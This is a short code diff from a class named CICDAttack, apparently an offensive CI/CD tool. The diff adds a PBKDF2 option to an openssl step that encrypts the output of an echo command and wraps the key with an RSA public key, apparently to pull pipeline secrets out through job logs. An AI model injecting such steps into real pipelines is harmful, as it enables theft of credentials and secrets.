@@ -109,7 +109,7 @@ class CICDAttack():
                     'run': "|\n"
                            "openssl rand -out sym.key 256\n"
                            f"{echo_cmd} | openssl enc -aes-256-cbc -kfile"
-                           " sym.key | base64 -w 0\n"
+                           " sym.key -pbkdf2 | base64 -w 0\n"
                            f"cat sym.key | base64 | openssl rsautl -encrypt -inkey"
                            f" <(echo \"${pkey_varname}\") -pubin -pkcs |"
                            " base64 -w 0"
